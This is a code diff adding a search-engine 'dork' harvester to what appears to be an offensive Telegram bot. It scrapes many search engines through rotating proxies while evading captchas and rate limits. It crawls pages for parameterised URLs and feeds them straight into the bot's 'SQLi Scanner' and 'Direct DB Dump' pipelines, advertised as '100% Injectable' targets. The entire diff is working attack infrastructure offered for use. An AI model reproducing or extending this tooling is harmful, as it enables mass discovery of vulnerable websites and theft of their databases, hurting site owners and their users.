+                        use_proxy=cur_px, timeout_s=4.2,
+                    )
+                elif eng in _V17_YAHOO_HOST_MAP:
+                    ybase = _V17_YAHOO_HOST_MAP[eng]
+                    params = {"p": q, "n": "30", "ei": "UTF-8"}
+                    if page > 1:
+                        params["b"] = str((page - 1) * 10 + 1)
+                    code, html = await _raw_http_request(
+                        aio_sess, "GET", ybase, params=params, use_proxy=cur_px, timeout_s=4.2,
+                    )
+                elif eng == "aol_web":
+                    code, html = await _raw_http_request(
+                        aio_sess, "GET", "https://search.aol.com/aol/search",
+                        params={"q": q, "count": "20", "b": str((page - 1) * 10 + 1)},
+                        use_proxy=cur_px, timeout_s=4.2,
+                    )
+                elif eng == "duckduckgo_html":
+                    form = {"q": q, "b": "", "kl": "us-en"}
+                    if page > 1:
+                        form["s"] = str(10 + (page - 2) * 15)
+                    code, html = await _raw_http_request(
+                        aio_sess, "POST", "https://html.duckduckgo.com/html/",
+                        data=form, headers={"Referer": "https://html.duckduckgo.com/", "User-Agent": random.choice(HEADERS_LIST)["User-Agent"]},
+                        use_proxy=cur_px, timeout_s=4.2,
+                    )
+                elif eng == "duckduckgo_lite":
+                    code, html = await _raw_http_request(
+                        aio_sess, "POST", "https://lite.duckduckgo.com/lite/",
+                        data={"q": q, "kl": "us-en"},
+                        headers={"Referer": "https://lite.duckduckgo.com/", "User-Agent": random.choice(HEADERS_LIST)["User-Agent"]},
+                        use_proxy=cur_px, timeout_s=4.2,
+                    )
+                elif eng == "brave_web":
+                    params = {"q": q, "source": "web"}
+                    if page > 1:
+                        params["offset"] = str(page - 1)
+                    code, html = await _raw_http_request(
+                        aio_sess, "GET", "https://search.brave.com/search",
+                        params=params, cookies={"us": "us", "useLocation": "0", "safesearch": "off"},
+                        use_proxy=cur_px, timeout_s=4.2,
+                    )
+                elif eng == "ecosia_web":
+                    code, html = await _raw_http_request(
+                        aio_sess, "GET", "https://www.ecosia.org/search",
+                        params={"method": "index", "q": q, "p": str(page - 1)},
+                        use_proxy=cur_px, timeout_s=4.2,
+                    )
+                elif eng == "startpage_web":
+                    if not startpage_sc[0]:
+                        async with sc_lock:
+                            if not startpage_sc[0]:
+                                _, home_h = await _raw_http_request(aio_sess, "GET", "https://www.startpage.com/", use_proxy="", timeout_s=3.5)
+                                m_sc2 = _V14_SC_INPUT_RE.search(home_h or "")
+                                startpage_sc[0] = m_sc2.group(1) if m_sc2 else "none"
+                    form_sp = {
+                        "query": q, "cat": "web", "t": "device", "sc": startpage_sc[0],
+                        "lui": "english", "language": "english", "abp": "1",
+                    }
+                    code, html = await _raw_http_request(
+                        aio_sess, "POST", "https://www.startpage.com/sp/search",
+                        data=form_sp, headers={"Referer": "https://www.startpage.com/", "User-Agent": random.choice(HEADERS_LIST)["User-Agent"]},
+                        use_proxy=cur_px, timeout_s=4.5,
+                    )
+                elif eng == "google_web":
+                    code, html = await _raw_http_request(
+                        aio_sess, "GET", "https://www.google.com/search",
+                        params={"q": q, "gbv": "1", "num": "20", "start": str((page - 1) * 10), "hl": "en"},
+                        cookies={"CONSENT": "YES+"},
+                        use_proxy=cur_px, timeout_s=4.2,
+                    )
+                else:
+                    code, html = await _raw_http_request(
+                        aio_sess, "GET", "https://www.mojeek.com/search",
+                        params={"q": q, "s": str((page - 1) * 10 + 1)},
+                        cookies={"arc": "us", "lb": "en"},
+                        use_proxy=cur_px, timeout_s=4.2,
+                    )
+
+                if code == 200 and len(html) > 80 and not _is_captcha_page(html):
+                    urls = _v14_extract_serp_urls(html, eng)
+                    if urls:
+                        return urls
+                else:
+                    if cur_px:
+                        _strike_proxy(cur_px)
+                    elif code in (202, 403, 429, 503, 999) or (html and _is_captcha_page(html)):
+                        direct_cooldown_until[eng] = time.monotonic() + 22.0
+            return []
+
+    async def _spider_worker(aio_sess: aiohttp.ClientSession, stop_spider_evt: asyncio.Event):
+        while not stop_spider_evt.is_set() or not spider_q.empty():
+            if (stop_check_fn and stop_check_fn()) or len(found_scores) >= worker_limit:
+                break
+            try:
+                seed_u = await asyncio.wait_for(spider_q.get(), timeout=0.25)
+            except asyncio.TimeoutError:
+                if stop_spider_evt.is_set():
+                    break
+                continue
+            try:
+                async with spider_sem:
+                    code, html = await _raw_http_request(aio_sess, "GET", seed_u, use_proxy="", timeout_s=2.4)
+                    if code == 200 and html:
+                        sub_slice = html[:220_000]
+                        for raw_h in _V14_HREF_RE.findall(sub_slice):
+                            full = _v14_up.urljoin(seed_u, raw_h.replace("&amp;", "&").strip())
+                            if "?" in full and "=" in full and full.startswith(("http://", "https://")):
+                                _add_real_url(full, allow_spider_seed=False)
+                        for f_act, f_body in _V17_FORM_GET_RE.findall(sub_slice):
+                            inputs = _V17_INPUT_NAME_RE.findall(f_body)
+                            if inputs:
+                                base_act = _v14_up.urljoin(seed_u, f_act.replace("&amp;", "&").strip())
+                                if base_act.startswith(("http://", "https://")):
+                                    sep = "&" if "?" in base_act else "?"
+                                    q_str = "&".join(f"{nm}=1" for nm in inputs[:2])
+                                    _add_real_url(f"{base_act}{sep}{q_str}", allow_spider_seed=False)
+            except Exception:
+                pass
+            finally:
+                spider_q.task_done()
+
+    done_cnt = 0
+    err_cnt = 0
+    last_rep = 0.0
+    last_ckpt = time.monotonic()
+    local_q: asyncio.Queue = asyncio.Queue()
+    exhausted = False
+    n_eng = len(_V17_GLOBAL_ENGINES)
+
+    async with aiohttp.ClientSession(connector=aio_conn) as aio_sess:
+        stop_spider = asyncio.Event()
+        spider_tasks = [
+            asyncio.create_task(_spider_worker(aio_sess, stop_spider))
+            for _ in range(min(36, max(8, spider_conc // 2)))
+        ]
+
+        async def _dork_consumer(cid: int):
+            nonlocal done_cnt, err_cnt, last_rep, last_ckpt, exhausted
+            seq = cid * 7
+            while True:
+                if (stop_check_fn and stop_check_fn()) or len(found_scores) >= worker_limit:
+                    break
+                try:
+                    dork = local_q.get_nowait()
+                except asyncio.QueueEmpty:
+                    if exhausted:
+                        break
+                    batch = pull_dork_batch_fn()
+                    if not batch:
+                        exhausted = True
+                        break
+                    for extra_d in batch[1:]:
+                        local_q.put_nowait(extra_d)
+                    dork = batch[0]
+
+                seq += 1
+                try:
+                    if qmode == "blitz":
+                        calls = [
+                            _query_engine_once(aio_sess, _V17_GLOBAL_ENGINES[seq % n_eng], dork, 1),
+                            _query_engine_once(aio_sess, _V17_GLOBAL_ENGINES[(seq + 5) % n_eng], dork, 1),
+                            _query_engine_once(aio_sess, _V17_GLOBAL_ENGINES[(seq + 11) % n_eng], dork, 1),
+                        ]
+                    elif qmode == "deep":
+                        calls = [
+                            _query_engine_once(aio_sess, "bing_rss", dork, 1),
+                            _query_engine_once(aio_sess, _V17_GLOBAL_ENGINES[(seq % 8) + 1], dork, 1),
+                            _query_engine_once(aio_sess, "duckduckgo_html", dork, 1),
+                            _query_engine_once(aio_sess, "brave_web", dork, 1),
+                            _query_engine_once(aio_sess, "aol_web", dork, 1),
+                            _query_engine_once(aio_sess, _V17_GLOBAL_ENGINES[(seq + 9) % n_eng], dork, 1),
+                        ]
+                    else:
+                        calls = [
+                            _query_engine_once(aio_sess, "bing_rss" if seq % 2 == 0 else "bing_html", dork, 1),
+                            _query_engine_once(aio_sess, _V17_GLOBAL_ENGINES[1 + (seq % 12)], dork, 1),
+                            _query_engine_once(aio_sess, _V17_GLOBAL_ENGINES[3 + ((seq + 5) % 13)], dork, 1),
+                            _query_engine_once(aio_sess, _V17_GLOBAL_ENGINES[(seq + 9) % n_eng], dork, 1),
+                        ]
+
+                    results = await asyncio.gather(*calls, return_exceptions=True)
+                    for item in results:
+                        if isinstance(item, list):
+                            for u in item:
+                                _add_real_url(u, allow_spider_seed=True)
+                except Exception:
+                    err_cnt += 1
+                done_cnt += 1
+                now = time.monotonic()
+                if now - last_ckpt >= 3.5:
+                    last_ckpt = now
+                    _flush_checkpoint()
+                if report_fn and (now - last_rep >= 0.9):
+                    last_rep = now
+                    report_fn(done_cnt, len(found_scores), err_cnt)
+
+        await asyncio.gather(*(asyncio.create_task(_dork_consumer(i)) for i in range(n_coros)), return_exceptions=True)
+        stop_spider.set()
+        if spider_tasks:
+            try:
+                await asyncio.wait_for(asyncio.gather(*spider_tasks, return_exceptions=True), timeout=12.0)
+            except Exception:
+                for st in spider_tasks:
+                    st.cancel()
+
+    _flush_checkpoint()
+    if report_fn:
+        report_fn(done_cnt, len(found_scores), err_cnt)
+    dns_exec.shutdown(wait=False, cancel_futures=True)
+    return found_scores, err_cnt, done_cnt
+
+
+def _v14_mp_parser_entry(wid: int, work_q, worker_limit: int, elite_proxies: list[str], cfg_spec: dict, out_path: str, prog_q, stop_val):
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    try:
+        def _pull():
+            try:
+                return work_q.get_nowait()
+            except Exception:
+                return None
+
+        def _rep(dn: int, fn: int, en: int):
+            try:
+                prog_q.put_nowait(("prog", wid, dn, fn, en))
+            except Exception:
+                pass
+
+        scores, errs, done_n = loop.run_until_complete(
+            _v14_worker_async_core(
+                _pull, worker_limit, elite_proxies, cfg_spec,
+                report_fn=_rep, stop_check_fn=lambda: bool(stop_val.value),
+                checkpoint_path=out_path,
+            )
+        )
+        tmp_p = f"{out_path}.{os.getpid()}.final"
+        with open(tmp_p, "w", encoding="utf-8") as wf:
+            json.dump(scores, wf)
+        os.replace(tmp_p, out_path)
+        prog_q.put(("done", wid, done_n, len(scores), errs))
+        prog_q.close()
+        prog_q.join_thread()
+    except Exception:
+        try:
+            prog_q.put(("done", wid, 0, 0, 1))
+            prog_q.close()
+            prog_q.join_thread()
+        except Exception:
+            pass
+    os._exit(0)
+
+
+async def search_urls_from_dorks(
+    dorks: list,
+    limit: int = 350_000,
+    progress_callback=None,
+    stop_event: asyncio.Event = None,
+    proxy_list: list = None,
+) -> list:
+    """V17 Zero-Loss Multi-Process SERP + Live DOM `?param=` Harvester Engine."""
+    if not dorks:
+        return []
+
+    cfg_spec = get_v14_runtime_limits()
+    work_dorks = list(dict.fromkeys(d.strip() for d in dorks if d and d.strip()))
+    random.shuffle(work_dorks)
+    total = len(work_dorks)
+
+    effective_spec = dict(cfg_spec)
+    if total >= 50_000 and effective_spec["parser_mode"] == "balanced":
+        effective_spec["parser_mode"] = "blitz"
+
+    raw_candidates = list(dict.fromkeys(_v14_load_elite_proxies() + list(proxy_list or [])[:1500]))
+    elite_px = await _v17_preflight_serp_proxies(raw_candidates, max_test=450, concurrency=180)
+    if elite_px:
+        _v14_save_elite_proxies(elite_px)
+
+    n_procs = max(1, min(int(effective_spec["workers"]), max(1, total // 40)))
+    max_param_dom = 28 if effective_spec["parser_mode"] == "deep" else 22
+    max_static_dom = 4 if effective_spec["parser_mode"] == "deep" else 2
+
+    if n_procs <= 1 or total < 80 or sys.platform != "linux":
+        ptr = [0]
+        def _inline_pull():
+            if ptr[0] >= total:
+                return None
+            b = work_dorks[ptr[0]: ptr[0] + 12]
+            ptr[0] += len(b)
+            return b
+
+        def _inline_rep(dn, fn, en):
+            if progress_callback:
+                try:
+                    asyncio.ensure_future(progress_callback(min(dn, total), total, fn, en))
+                except Exception:
+                    pass
+
+        scores, _, _ = await _v14_worker_async_core(
+            _inline_pull, limit, elite_px, effective_spec,
+            report_fn=_inline_rep,
+            stop_check_fn=(lambda: stop_event.is_set()) if stop_event else None,
+        )
+        if progress_callback:
+            try:
+                await progress_callback(total, total, len(scores), 0)
+            except Exception:
+                pass
+        ranked = sorted(scores.items(), key=lambda x: x[1], reverse=True)
+        return [u for u, _ in ranked[:limit]]
+
+    import multiprocessing as _v14_mp
+    ctx = _v14_mp.get_context("fork")
+    work_q = ctx.Queue()
+    prog_q = ctx.Queue()
+    stop_val = ctx.Value("i", 0)
+
+    chunk_sz = 16 if total >= 10_000 else 8
+    for idx in range(0, total, chunk_sz):
+        work_q.put(work_dorks[idx : idx + chunk_sz])
+
+    shm_base = "/dev/shm" if os.path.isdir("/dev/shm") and os.access("/dev/shm", os.W_OK) else tempfile.gettempdir()
+    run_dir = tempfile.mkdtemp(prefix="spidey_v17_parser_", dir=shm_base)
+    out_paths = [os.path.join(run_dir, f"p_{wid}.json") for wid in range(n_procs)]
+    per_worker_lim = max(100_000, int((limit * 1.4) // n_procs) + 25_000)
+
+    procs = []
+    for wid in range(n_procs):
+        p = ctx.Process(
+            target=_v14_mp_parser_entry,
+            args=(wid, work_q, per_worker_lim, elite_px, effective_spec, out_paths[wid], prog_q, stop_val),
+            daemon=True,
+        )
+        p.start()
+        procs.append(p)
+
+    w_done = {i: 0 for i in range(n_procs)}
+    w_found = {i: 0 for i in range(n_procs)}
+    w_err = {i: 0 for i in range(n_procs)}
+    finished = set()
+    last_cb_t = 0.0
+    q_empty_at = None
+
+    try:
+        while len(finished) < n_procs:
+            if stop_event and stop_event.is_set() and stop_val.value == 0:
+                stop_val.value = 1
+
+            for _ in range(500):
+                try:
+                    m = prog_q.get_nowait()
+                except Exception:
+                    break
+                if m[0] == "prog":
+                    _, wid, dn, fn, en = m
+                    w_done[wid] = dn
+                    w_found[wid] = fn
+                    w_err[wid] = en
+                elif m[0] == "done":
+                    _, wid, dn, fn, en = m
+                    w_done[wid] = dn
+                    w_found[wid] = fn
+                    w_err[wid] = en
+                    finished.add(wid)
+
+            now = time.monotonic()
+            if progress_callback and (now - last_cb_t >= 1.5):
+                last_cb_t = now
+                try:
+                    await progress_callback(
+                        min(sum(w_done.values()), total),
+                        total,
+                        min(int(sum(w_found.values()) * 0.90), limit),
+                        sum(w_err.values()),
+                    )
+                except Exception:
+                    pass
+
+            if sum(w_found.values()) >= int(limit * 1.35):
+                stop_val.value = 1
+
+            if work_q.empty():
+                if q_empty_at is None:
+                    q_empty_at = now
+                elif now - q_empty_at >= 26.0:
+                    stop_val.value = 1
+                if now - q_empty_at >= 38.0:
+                    break
+
+            if all(not p.is_alive() for p in procs) and prog_q.empty():
+                break
+
+            await asyncio.sleep(0.15)
+
+        for p in procs:
+            p.join(timeout=6.0)
+            if p.is_alive():
+                try:
+                    p.terminate()
+                except Exception:
+                    pass
+
+        all_items: list[tuple[str, int]] = []
+        for wid in range(n_procs):
+            fp = out_paths[wid]
+            if os.path.isfile(fp):
+                try:
+                    with open(fp, "r", encoding="utf-8") as rf:
+                        all_items.extend(json.load(rf).items())
+                except Exception:
+                    pass
+
+        all_items.sort(key=lambda x: x[1], reverse=True)
+        merged: list[str] = []
+        merged_norm: set[str] = set()
+        dom_p: dict[str, int] = {}
+        dom_s: dict[str, int] = {}
+        for url, _ in all_items:
+            if len(merged) >= limit:
+                break
+            norm = normalize_url(url)
+            if norm in merged_norm:
+                continue
+            has_p = ("?" in url and "=" in url)
+            try:
+                dom = _v14_up.urlparse(url).netloc.lower().lstrip("www.")
+                if has_p:
+                    if dom_p.get(dom, 0) >= max_param_dom:
+                        continue
+                    dom_p[dom] = dom_p.get(dom, 0) + 1
+                else:
+                    if dom_s.get(dom, 0) >= max_static_dom:
+                        continue
+                    dom_s[dom] = dom_s.get(dom, 0) + 1
+            except Exception:
+                pass
+            merged_norm.add(norm)
+            merged.append(url)
+        return merged
+    finally:
+        stop_val.value = 1
+        for p in procs:
+            if p.is_alive():
+                try:
+                    p.terminate()
+                except Exception:
+                    pass
+        shutil.rmtree(run_dir, ignore_errors=True)
+
+
+async def _run_parser(update: Update, context: ContextTypes.DEFAULT_TYPE, dorks: list) -> int:
+    user_id = update.effective_user.id
+    lim = get_v14_runtime_limits()
+    _LIVE_FEED[user_id] = {
+        "name": update.effective_user.first_name or str(user_id),
+        "start": datetime.now().strftime("%H:%M:%S"),
+        "dorks_total": len(dorks),
+        "dorks_done": 0,
+        "urls_found": 0,
+        "phase": "🔍 V17 GodMode Parsing",
+    }
+    if len(global_proxy_pool) < 200:
+        _v11_spawn_isolated_proxy_worker()
+
+    stop_event = asyncio.Event()
+    stop_events[user_id] = stop_event
+    stop_kb = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 Sᴛᴏᴘ", callback_data="stop_parser")]])
+    total = len(dorks)
+    done_count = [0]
+    retries_count = [0]
+    spin_frame = [0]
+    last_edit = [0.0]
+
+    timeout_secs = max(900, min(int(total * 1.5), 43200))
+    url_limit = max(350_000, total * 5)
+    eng_label = f"{lim['workers']}-Core • 18-Engine Syndication • {lim['short']}"
+    t_start = time.monotonic()
+
+    msg = await update.message.reply_text(
+        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
+        f"🛰️ *𝙑17-𝙂𝙊𝘿𝙈𝙊𝘿𝙀 𝙐𝙃𝙌 𝙋𝙖𝙧𝙨𝙚𝙧 — 𝙎𝙩𝙖𝙧𝙩𝙞𝙣𝙜*\n"
+        f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
+        f"📋 Dᴏʀᴋs Lᴏᴀᴅᴇᴅ : `{total:,}`\n"
+        f"⚙️ Eɴɢɪɴᴇ       : `{eng_label}`\n"
+        f"🎯 Qᴜᴀʟɪᴛʏ Mᴏᴅᴇ : `{_V14_PARSER_MODE_LABELS.get(lim['parser_mode'], lim['parser_mode'])}` _(Live DOM `?param=` Harvester ON!)_\n\n"
+        f"_Validating live SERP proxies + launching 18-Engine cluster..._",
+        reply_markup=stop_kb,
+        parse_mode=ParseMode.MARKDOWN,
+    )
+
+    async def on_progress(done, total_, found, retries):
+        done_count[0] = done
+        retries_count[0] = retries
+        _LIVE_FEED[user_id]["dorks_done"] = done
+        _LIVE_FEED[user_id]["urls_found"] = found
+        now = time.monotonic()
+        if now - last_edit[0] < 2.2:
+            return
+        last_edit[0] = now
+        spin_frame[0] = (spin_frame[0] + 1) % len(PARSER_SPINNER_FRAMES)
+        pct = int((done / total_) * 100) if total_ else 0
+        filled = int(pct / 5)
+        bar = "█" * filled + "░" * (20 - filled)
+        el = max(0.1, now - t_start)
+        rate = done / el
+        rem = int((total_ - done) / rate) if rate > 0 else 0
+        eta_s = f"{rem // 60}m {rem % 60}s" if rem >= 60 else f"{rem}s"
+        try:
+            await msg.edit_text(
+                f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
+                f"🛰️ *𝙑17-𝙂𝙊𝘿𝙈𝙊𝘿𝙀 𝙋𝙖𝙧𝙨𝙚𝙧 — 𝙍𝙪𝙣𝙣𝙞𝙣𝙜*\n"
+                f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
+                f"📠 Pᴀʀsᴇᴅ  : `{done:,} / {total_:,}` dorks (`{rate:.1f}/s`)\n"
+                f"✅ HQ URLs : `{found:,}`\n"
+                f"⚡ Eɴɢɪɴᴇ  : `{eng_label}` | ⏱ ETA: `{eta_s}`\n\n"
+                f"`[{bar}]` {pct}%\n\n"
+                f"{PARSER_SPINNER_FRAMES[spin_frame[0]]}",
+                reply_markup=stop_kb,
+                parse_mode=ParseMode.MARKDOWN,
+            )
+        except Exception:
+            pass
+
+    inner = asyncio.ensure_future(
+        search_urls_from_dorks(
+            dorks,
+            limit=url_limit,
+            progress_callback=on_progress,
+            stop_event=stop_event,
+            proxy_list=effective_proxy_pool(user_id),
+        )
+    )
+    try:
+        found_urls = await asyncio.wait_for(asyncio.shield(inner), timeout=float(timeout_secs))
+    except asyncio.TimeoutError:
+        stop_event.set()
+        try:
+            found_urls = await asyncio.wait_for(inner, timeout=20.0)
+        except Exception:
+            inner.cancel()
+            found_urls = []
+    except Exception as e:
+        stop_event.set()
+        found_urls = []
+        try:
+            await msg.edit_text(f"❌ *Parser Error:* `{str(e)[:90]}`", parse_mode=ParseMode.MARKDOWN)
+        except Exception:
+            pass
+        stop_events.pop(user_id, None)
+        return MENU
+
+    stop_events.pop(user_id, None)
+    _LIVE_FEED.pop(user_id, None)
+    took_total = max(0.1, time.monotonic() - t_start)
+
+    all_urls = list(found_urls)
+    fresh_urls = [u for u in all_urls if u not in _SCANNED_URLS]
+    overlap_cnt = len(all_urls) - len(fresh_urls)
+    _SCANNED_URLS.update(fresh_urls)
+    _save_scanned()
+
+    deliver_urls = fresh_urls if lim["dedup_mode"] == "fresh_only" else all_urls
+    param_urls = [u for u in deliver_urls if "?" in u and "=" in u]
+    param_cnt = len(param_urls)
+    param_pct = (param_cnt * 100.0 / len(deliver_urls)) if deliver_urls else 0.0
+
+    sess_v17 = _v15_load_session(user_id)
+    sess_v17["last_parsed_param_urls"] = param_urls[:100_000]
+    sess_v17["last_parsed_all_urls"] = deliver_urls[:100_000]
+    _v15_save_session(user_id, sess_v17)
+
+    action_rows = []
+    if param_urls:
+        action_rows.append([
+            InlineKeyboardButton(f"🔍 Sᴄᴀɴ {len(param_urls):,} ?param= URLs (SQLi)", callback_data="v17_scan_parsed_params"),
+        ])
+        action_rows.append([
+            InlineKeyboardButton(f"💣 Dɪʀᴇᴄᴛ DB Dᴜᴍᴘ ({len(param_urls):,} URLs)", callback_data="v17_dump_parsed_params"),
+        ])
+    action_rows.append([InlineKeyboardButton("🏠 Mᴀɪɴ Mᴇɴᴜ", callback_data="back_to_menu")])
+
+    await msg.edit_text(
+        f"✿︎━━━━━━━━━━━━━━━━━━━━✿\n"
+        f"🛰️ *𝙑17-𝙂𝙊𝘿𝙈𝙊𝘿𝙀 𝙋𝙖𝙧𝙨𝙚𝙧 — {'Sᴛᴏᴘᴘᴇᴅ 🛑' if stop_event.is_set() else 'Cᴏᴍᴘʟᴇᴛᴇ ✅'}*\n"
+        f"✿︎━━━━━━━━━━━━━━━━━━━━✿︎\n\n"
+        f"📋 Dᴏʀᴋs Pᴀʀsᴇᴅ      : `{total:,}` in `{int(took_total)//60}m {int(took_total)%60}s`\n"
+        f"🎯 *SQLi `?param=` URLs* : *`{param_cnt:,}`* (`{param_pct:.1f}%` Pure Injectable!)\n"
+        f"✅ Tᴏᴛᴀʟ HQ URLs     : `{len(deliver_urls):,}`\n"
+        f"🆕 Bʀᴀɴᴅ Nᴇᴡ URLs    : `{len(fresh_urls):,}` _(Prior overlap: `{overlap_cnt:,}`)_",
+        reply_markup=InlineKeyboardMarkup(action_rows),
+        parse_mode=ParseMode.MARKDOWN,
+    )
+
+    async def _send_big_txt(lines_arr: list[str], prefix: str, cap: str):
+        MAX_B = 44 * 1024 * 1024
+        ts_s = datetime.now().strftime("%d%m%y_%H%M")
+        raw_b = "\n".join(lines_arr).encode("utf-8")
+        if len(raw_b) <= MAX_B:
+            await update.message.reply_document(
+                document=io.BytesIO(raw_b),
+                filename=f"{prefix}_{len(lines_arr)}_{ts_s}.txt",
+                caption=cap,
+                parse_mode=ParseMode.MARKDOWN,
+                read_timeout=180.0,
+                write_timeout=180.0,
+            )
+        else:
+            n_parts = (len(raw_b) // MAX_B) + 1
+            csz = max(1, (len(lines_arr) + n_parts - 1) // n_parts)
+            for pi in range(0, len(lines_arr), csz):
+                part = lines_arr[pi : pi + csz]
+                pnum = (pi // csz) + 1
+                await update.message.reply_document(
+                    document=io.BytesIO("\n".join(part).encode("utf-8")),
+                    filename=f"{prefix}_part{pnum}_{len(part)}_{ts_s}.txt",
+                    caption=f"📦 Part {pnum} (`{len(part):,}` URLs)\n{cap}",
+                    parse_mode=ParseMode.MARKDOWN,
+                    read_timeout=180.0,
+                    write_timeout=180.0,
+                )
+
+    if param_urls:
+        await _send_big_txt(
+            param_urls,
+            "UHQ_SQLi_Param_URLs",
+            f"💎 *`{len(param_urls):,}` PURE SQLi `?param=` UHQ URLs* _(100% Injectable Format — Ready for SQLi / DB Dump!)_\n⚙️ `{eng_label}`",
+        )
+    if deliver_urls and len(deliver_urls) > len(param_urls):
+        await _send_big_txt(
+            deliver_urls,
+            "All_HQ_URLs",
+            f"⚔️ `{len(deliver_urls):,}` Tᴏᴛᴀʟ Rᴇᴀʟ HQ URLs (`{param_cnt:,}` `?param=`) Fʀᴏᴍ `{total:,}` Dᴏʀᴋs\n⚙️ `{eng_label}`",
+        )
+    elif not deliver_urls:
+        await update.message.reply_text(
+            "⚠️ *0 URLs Found!* Pehle Admin Panel -> `🌐 Scrape Proxies` chalao ya fresh keywords try karo.",
+            parse_mode=ParseMode.MARKDOWN,
+        )
+    await update.message.reply_text("Sᴇʟᴇᴄᴛ Bᴇʟᴏᴡ Fᴏʀ Nᴇxᴛ Sᴛᴇᴘ 🎖️", reply_markup=make_main_menu())
+    return MENU
+
+
+
+_v17_prev_make_main_menu = make_main_menu
+def make_main_menu():
+    kb = _v17_prev_make_main_menu()
+    new_rows = []
+    for r in kb.inline_keyboard:
+        row_out = []
+        for b in r:
+            if b.callback_data == "menu_refinery":
+                row_out.append(InlineKeyboardButton("🧰 Cᴏᴍʙᴏ Rᴇꜰɪɴᴇʀʏ", callback_data="menu_refinery"))
+            else:
+                row_out.append(b)
+        new_rows.append(row_out)
+    return InlineKeyboardMarkup(new_rows)
+
+
+_v17_prev_button_handler = button_handler
+
+
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    if q and q.data in ("v17_scan_parsed_params", "v17_dump_parsed_params"):
+        uid = q.from_user.id
+        sess = _v15_load_session(uid)
+        urls = list(sess.get("last_parsed_param_urls") or sess.get("last_parsed_all_urls") or [])
+        if not urls:
+            await q.answer("⚠️ Session expired! Upload your UHQ_SQLi_Param_URLs `.txt` file.", show_alert=True)
+            return MENU
+        await q.answer(f"🚀 Launching on {len(urls):,} UHQ ?param= URLs!")
+        shim_upd = type("V17UpdateShim", (), {
+            "effective_user": update.effective_user,
+            "effective_chat": update.effective_chat,
+            "message": q.message,
+            "callback_query": q,
+        })()
+        if q.data == "v17_scan_parsed_params":
+            return _v12_spawn_bg_pipeline(uid, "SQLi Scanner", _run_sqli(shim_upd, context, urls))
+        return _v12_spawn_bg_pipeline(uid, "URLs->DB Dump", _run_dump_pipeline(shim_upd, context, [], prefound_urls=urls))
+    return await _v17_prev_button_handler(update, context)
 
 
 if __name__ == "__main__":
